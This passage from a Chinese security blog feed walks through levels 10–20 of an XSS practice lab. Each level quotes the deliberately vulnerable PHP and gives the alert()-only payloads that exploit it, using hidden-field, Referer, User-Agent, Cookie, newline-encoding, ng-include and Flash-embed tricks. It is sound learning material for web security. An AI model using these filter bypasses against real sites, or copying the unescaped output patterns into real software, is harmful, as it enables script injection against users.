class="line">前面不说了，看看后面，这里需要判断是否存在http:// 判断链接是否合法，这里我们直接在最后添加就可以绕过了</span><br></pre></td></tr></table></figure><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><blockquote><p>慢慢的难度提升了，这道题直接闭合不了，基本没有测出来什么东西，抓个包看看吧，也没啥，看看源代码，看到有三个参数是hidden的，尝试传参</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-9fafa705745e1512.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570204862947.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">keyword=1&amp;t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(24)</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot; &quot; type=&quot;text&quot; onclick = &quot;alert(25)&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">type=&quot;text&quot; 指定后可以将hidden内容显示&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>创建一个文本框，然后去点击</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-ba2f8df49dc05d13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570204987345.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">get 获取两个变量，之后过滤了&lt;&gt; 然后html实体化，之后在t_sort 中通过value赋值绕过引起xss</span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>和10题类似，同样有隐藏的内容，尝试type指定为text查看</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-a9fb4b946d863db0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570242428551.png"></p><p>keyword=good job!&amp;t_sort=”type=”text” onclick=”alert(26) 被转义了，看来这里很难绕过了。请教了下百度</p><p><img src="https://upload-images.jianshu.io/upload_images/18851353-97ca31f071cca067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570242567789.png"></p><p> 这题先看源码吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">果然，这道题的关键点在str11参数，获取referer处，查看前端源码也可以获取到一个t_ref变量，那么对于str11只过滤了&lt;&gt; 这样就可以使用on去绕过了</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload 抓包 在Referer处添加</span><br><span class="line">“ onmouseover=alert(26) type=&quot;text&quot;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-eea57022dca81921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243195814.png"></p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><blockquote><p>测试各个位置是否存在xss ，然后记得长个心眼，比如 referer，ua位置也要记得测试</p><p>这道题，ua处隐藏了，但是value获取了值，这里很可能存在xss</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-7b6af3dd50b2c246.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243379119.png"></p><p>果然，在ua处添加xss代码成功弹xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onclick=alert(27) type=&quot;text&quot;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-a0cc3f832c6133b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243485003.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">和上一题一样，对于ua处只判断了&lt;&gt; 这里使用on事件直接绕过</span><br></pre></td></tr></table></figure><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><blockquote><p>同样检查一下源代码，可能存在绕过，看变量那么这道题的关键就是cookie了</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-332e59fae97f8696.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243622176.png"></p><blockquote><p>抓包 修改cookie，尝试弹xss</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-3a400589fc87461a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243693173.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&quot; onmousedown=alert(28) type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-dc5339724c2342ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570243732008.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_cook&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">同12和11 在cookie处返回的时候没有过滤完全导致xss</span><br></pre></td></tr></table></figure><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><blockquote><p>查看绕过信息，查看源代码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Loading...&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&apos;text/javascript&apos;&gt;window.location.replace(&apos;http://www.exifviewer.org/?js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTU3MDI1MzMxNCwiaWF0IjoxNTcwMjQ2MTE0LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIybjVhNTFjNXM3dWg3cnY1aW8wMDlya2YiLCJuYmYiOjE1NzAyNDYxMTQsInRzIjoxNTcwMjQ2MTE0NDUyNTIyfQ.T1jdJkux82fMYT9U0brel9BKH1n0876y_n_pLpdTug0&amp;sid=74b4763c-e71f-11e9-875c-26f312502ec5&apos;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>这关不知道怎么过了，再次百度,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload  exif viewer的漏洞,漏洞原理是通过修改图片的exif信息</span><br><span class="line"> &quot;&gt;&lt;img src=1 onerror=alert(29)&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level14&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">这关好像没php代码，果然崩了下一关</span><br></pre></td></tr></table></figure><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>15关怎么挂了，看看源码先</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>打不成功，查看没有反应，这关考的是对于ng-include 通过文件包含加载xss</p><p>放几个网上找来的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">&apos;level1.php?name=&lt;script&gt;alert(30)&lt;/script&gt;&apos;</span><br><span class="line">&apos;level1.php?name=&lt;img src=x onerror=alert(31)&gt;&apos;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><blockquote><p>测试输入，感觉又和之前的比较相似了</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-9048d5550fed076a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570247865284.png"></p><p>过滤了script，/ , 空格也被替换了,尝试使用%0a代替空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&lt;svg%0Aonclick=alert(32)&gt;</span><br><span class="line">&lt;img%0Dsrc=1%0Donerror=alert(33)&gt;</span><br><span class="line">&lt;img%0Asrc=1%0Aonerror=alert(34)&gt;</span><br><span class="line">&lt;ifame%0asrc=1%0aonmouseover=alert(35)&gt;&lt;/ifame&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/18851353-2a28bae31ba6e760.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248128780.png"><br><img src="https://upload-images.jianshu.io/upload_images/18851353-c8b911ba89f82644.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248220380.png"><br><img src="https://upload-images.jianshu.io/upload_images/18851353-9385c1bcd2530d7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248486260.png"></p><p>看看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;  &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">替换，大小写，之后输出，所以这里需要通过编码绕过&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><blockquote><p>传入了两个变量，所以这关有可能xss在其中一个，或者都可能被利用</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/18851353-b3df21eca681efdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248684745.png"></p><p>看看源代码<br><img src="https://upload-images.jianshu.io/upload_images/18851353-7f5884febcbad993.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248786085.png"></p><p>尝试使用on去弹 失败<br><img src="https://upload-images.jianshu.io/upload_images/18851353-c852ba920c8101e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570249111491.png"></p><p> 查看下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123; </span><br><span class="line">confirm(&quot;完成的不错！&quot;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level17&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">通过追加写入src中</span><br></pre></td></tr></table></figure><blockquote><p>弹不出来 ，难受</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看看别人是怎么写的</span><br><span class="line">arg01= onmousemove&amp;arg02=alert(36) ，以追加的形式构成xss脚本，</span><br><span class="line">arg01=1&amp;arg02= onmouseover=alert(37) 直接以事件形式弹&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><blockquote><p>和17类似 构造事件, 灵异事件 弹不成功</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">arg01= onmousemove&amp;arg02=alert(38) ，以追加的形式构成xss脚本，</span><br><span class="line">arg01=1&amp;arg02= onmouseover=alert(39) 直接以事件形式弹&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123; </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level19.php?arg01=a&amp;arg02=b&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level18&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">感觉和17差不多，不多说了</span><br></pre></td></tr></table></figure><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><blockquote><p>19 和20 难度较大，这里</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123; </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level20.php?arg01=a&amp;arg02=b&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level19&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &apos;&lt;embed src=&quot;xsf03.swf?&apos;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&apos;&quot; width=100% heigth=100%&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这道题是flash xss</p></blockquote><p>不咋会做 放上payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(40)&quot;&gt;123&lt;/a&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>不会做</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(41)&quot;&gt;123&lt;/a&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><hr><p>参考文章：</p><p><a href="https://www.jianshu.com/p/4e3a517bc4ea" target="_blank" rel="noopener">https://www.jianshu.com/p/4e3a517bc4ea</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9446472.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9446472.html</a></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/95174440" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44077544/article/details/95174440</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xss-通关小游戏&quot;&gt;&lt;a href=&quot;#xss-通关小游戏&quot; class=&quot;headerlink&quot; title=&quot;xss 通关小游戏&quot;&gt;&lt;/a&gt;xss 通关小游戏&lt;/h1&gt;&lt;h2 id=&quot;搭建环境&quot;&gt;&lt;a href=&quot;#搭建环境&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://yoursite.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>配置NAT实现网络互通</title>
    <link href="http://yoursite.com/2019/10/04/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/%E9%85%8D%E7%BD%AEnat%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E4%BA%92%E9%80%9A/"/>
    <id>http://yoursite.com/2019/10/04/实用技巧/配置nat实现网络互通/</id>
    <published>2019-10-04T05:44:23.000Z</published>
    <updated>2019-10-04T05:44:24.525Z</updated>
    
